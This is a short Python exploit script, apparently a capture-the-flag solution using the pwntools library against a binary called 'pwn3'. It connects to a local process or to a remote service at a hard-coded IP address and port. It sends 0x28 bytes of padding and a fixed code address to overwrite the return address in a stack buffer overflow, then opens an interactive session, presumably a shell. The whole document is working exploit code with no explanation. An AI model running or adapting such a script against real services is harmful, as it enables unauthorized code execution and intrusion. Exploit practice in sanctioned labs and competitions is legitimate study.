#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./pwn3')
elif debug == 0:
    p = remote('117.139.247.14', 9636)

pd = 'a' * 0x28
pd += p64(0x00000000004005B6)
p.sendline(pd)
p.interactive()
